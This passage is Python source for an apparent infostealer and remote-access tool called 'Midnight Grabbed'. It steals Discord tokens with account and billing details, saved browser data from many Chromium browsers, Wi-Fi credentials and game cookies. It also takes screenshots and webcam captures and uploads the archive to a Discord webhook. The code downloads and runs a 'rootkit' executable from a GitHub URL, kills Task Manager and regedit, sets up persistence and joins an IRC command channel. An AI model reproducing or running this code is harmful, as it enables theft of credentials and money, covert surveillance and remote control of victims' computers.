            "avatar_url": "https://cdn.discordapp.com/attachments/1281294948099952640/1286772744108642447/discord-avatar-512-W81PS.png",
            "embeds": [embed]
        })
    }

    with open(archive_path, "rb") as archive:
        files = {"file": (os.path.basename(archive_path), archive)}
        response = requests.post(webhook, data=payload, files=files)
        if response.status_code == 204:
            print("Archive and embed message sent successfully!")
        else:
            print(f"Failed to send embed or archive. Status code: {response.status_code}, Response: {response.text}")

def check_corrupt():
    system32_path = r"C:\Windows\System32\$77"
    midnight_folder = os.path.join(system32_path, "Midnight Grabbed")

    if os.path.exists(midnight_folder):
        shutil.rmtree(midnight_folder)

def archive_midnight_grabbed():
    system32_path = r"C:\Windows\System32"
    target_folder = os.path.join(system32_path, "$77")
    if not os.path.exists(target_folder):
        return

    midnight_folder = os.path.join(target_folder, "Midnight Grabbed")
    if os.path.isdir(midnight_folder):
        username = getpass.getuser()
        renamed_folder = os.path.join(target_folder, f"Midnight~{username}")
        os.rename(midnight_folder, renamed_folder)

        archive_path = renamed_folder + ".rar"
        with zipfile.ZipFile(archive_path, 'w') as archive:
            for root, dirs, files in os.walk(renamed_folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    archive.write(file_path, os.path.relpath(file_path, renamed_folder))

        shutil.rmtree(renamed_folder)

def delete_archive():
    username = f"{os.getenv('USERNAME')}"
    archive_path = f"C:\Windows\System32\$77\Midnight~{username}.rar"
    if os.path.exists(archive_path):
        os.remove(archive_path)

async def run_all_shit():
    banner_tag = "============== Encrypted ==============\n"
    webhook = f'{get_webhook()}'
    webhook_url = f'{get_webhook()}'
    # ----------------------------------------------------------------
    discord_injector = DiscordInjection()
    await discord_injector.InjectIntoToDiscord(webhook_url)
    # ----------------------------------------------------------------
    check_corrupt()
    # ----------------------------------------------------------------
    recovery_folder = RecoveryFolder()
    recovery_folder.create_structure()
    # ----------------------------------------------------------------
    base_dir = r"C:\Windows\System32\$77\Midnight Grabbed\Messaging\Discord"
    os.makedirs(base_dir, exist_ok=True)
    output_file = os.path.join(base_dir, "Discord_Browser.txt")
    tokens_info = Discord.GetTokens()
    with open(output_file, "w") as file:
        for token_data in tokens_info:
            file.write(banner_tag)
            file.write(f"Username : {token_data['USERNAME']}\n")
            file.write(f"UserID : {token_data['USERID']}\n")
            file.write(f"MFA : {token_data['MFA']}\n")
            file.write(f"Email : {token_data['EMAIL']}\n")
            file.write(f"Phone : {token_data['PHONE']}\n")
            file.write(f"Verified : {token_data['VERIFIED']}\n")
            file.write(f"Nitro : {token_data['NITRO']}\n")
            file.write(f"Billing : {token_data['BILLING']}\n")
            file.write(f"Token : {token_data['TOKEN']}\n")
            file.write(f"Gifts : {token_data['GIFTS']}\n")
            file.write(banner_tag)
    # ----------------------------------------------------------------
    stealer = DiscordTokenStealer()
    stealer.steal_token()
    # ----------------------------------------------------------------
    browserPaths = {
        "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Chrome" : os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
        "Chromium" : os.path.join(os.getenv("localappdata"), "Chromium", "User Data"),
        "Comodo" : os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"),
        "Edge" : os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
        "EpicPrivacy" : os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"),
        "Iridium" : os.path.join(os.getenv("localappdata"), "Iridium", "User Data"),
        "Opera" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"),
        "Opera GX" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"),
        "Slimjet" : os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"),
        "UR" : os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"),
        "Vivaldi" : os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"),
        "Yandex" : os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data")
    }

    for browser, browser_path in browserPaths.items():
        if os.path.isdir(browser_path):
            print(f"Accessing {browser} browser data at {browser_path}")
            try:
                chromium_browser = Browsers.Chromium(browser_path)
                chromium_browser = Browsers.Chromium(browser_path)
                chromium_browser.SaveBrowserData()
            except Exception as e:
                print(f"Error accessing {browser}: {e}")
        else:
            print(f"{browser} directory not found. Skipping...")
    # ----------------------------------------------------------------
    wifi = Wifi()
    wifi.get_wifi_info()
    # ----------------------------------------------------------------
    game = Game()
    game.GrabBrowserCookies()
    game.StealRobloxCookies()
    # ----------------------------------------------------------------
    recovery_folder.create_files()
    recovery_folder.take_screenshot()
    recovery_folder.capture_webcam()
    # ----------------------------------------------------------------
    get_token()
    # ----------------------------------------------------------------
    archive_midnight_grabbed()
    # ----------------------------------------------------------------
    username = f"{os.getenv('USERNAME')}"
    archive_path = f"C:\Windows\System32\$77\Midnight~{username}.rar"
    system_info = get_system_info()
    serials = get_serials()
    ip_info = get_public_ip_info()
    send_archive_with_embed(system_info, serials, ip_info, archive_path)
    delete_archive()
    # ----------------------------------------------------------------

# -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


def fetch_python_code(installer_url):
    try:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        headers = {'User-Agent': user_agent}
        req = urllib.request.Request(installer_url, headers=headers)
        with urllib.request.urlopen(req) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Error fetching code from {installer_url}: {e}")
        return None

def write_python_file(installer_url):
    try:
        code = fetch_python_code(installer_url)
        if code:
            temp_dir = os.getenv('TEMP')
            py_file_path = os.path.join(temp_dir, "installer.py")
            with open(py_file_path, 'w', encoding='utf-8') as f:
                f.write(code)
            return py_file_path
        else:
            print("Error: No code to write for installer.")
            return None
    except Exception as e:
        print(f"Error writing installer file: {e}")
        return None

def move_files():
    try:
        temp_dir = os.getenv('TEMP')
        dest_dir = os.path.join(os.getenv('APPDATA'), "T3mp")
        os.makedirs(dest_dir, exist_ok=True)

        for filename in os.listdir(temp_dir):
            if filename.endswith(('.exe', '.py', '.pyc')):
                shutil.move(os.path.join(temp_dir, filename), dest_dir)
    except Exception as e:
        print(f"Error moving files: {e}")

def connect_to_internet_relay_chat():
    server = f"{get_irc_server()}"
    port = 6697
    channel = f"{get_irc_channel()}"
    channel_password = f"{get_irc_password()}"

    irc = connect_to_irc(server, port, channel, channel_password)
    if irc:
        handle_messages(irc, channel)
    print("Error connecting re-directing.")
    error_connecting_to_irc()

def error_connecting_to_irc():
    os.system('cls')
    print("Temporary ~ error connecting to irc")
    while True:
        time.sleep(1)
        connect_to_internet_relay_chat()
        print("Temporary ~ error connecting to irc")

def create_rootkit_folder():
    folder_path = os.path.join(os.environ['WINDIR'], "System32", "$77.")
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    return folder_path

def rootkit():
    folder_path = create_rootkit_folder()

    url_uninstall = "https://github.com/247msn/96737693845/raw/refs/heads/main/Uninstall.exe"
    uninstall_path = os.path.join(folder_path, "UnInstall.exe")

    url_install = "https://github.com/247msn/96737693845/raw/refs/heads/main/Install.exe"
    install_path = os.path.join(folder_path, "Install.exe")
    
    try:
        urllib.request.urlretrieve(url_uninstall, uninstall_path)
        os.system(f'"{uninstall_path}"')
        os.remove(uninstall_path)
    except Exception as e:
        pass
    
    try:
        urllib.request.urlretrieve(url_install, install_path)
        os.system(f'"{install_path}"')
        os.remove(install_path)
    except Exception as e:
        pass

def create_mutex(mutex_value):
    kernel32 = ctypes.windll.kernel32
    mutex = kernel32.CreateMutexA(None, False, mutex_value.encode('utf-8'))
    return kernel32.GetLastError() != 183

def kill_tasks():
    tasks = ["Taskmgr.exe", "regedit.exe"]

    for task in tasks:
        try:
            for process in psutil.process_iter(['name']):
                if process.info['name'] and process.info['name'].lower() == task.lower():
                    process.terminate()
        except Exception:
            print("Error closing file")

if __name__ == '__main__':
    mutex_value = "0df98shuj87u8hu382jr892as543dfg"
    if create_mutex(mutex_value):
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Mutex created successfully.")
        rootkit()
        kill_tasks()
        startups()
        asyncio.run(run_all_shit())
        connect_to_internet_relay_chat()
    else:
        print("Mutex already exists.")
        sys.exit()
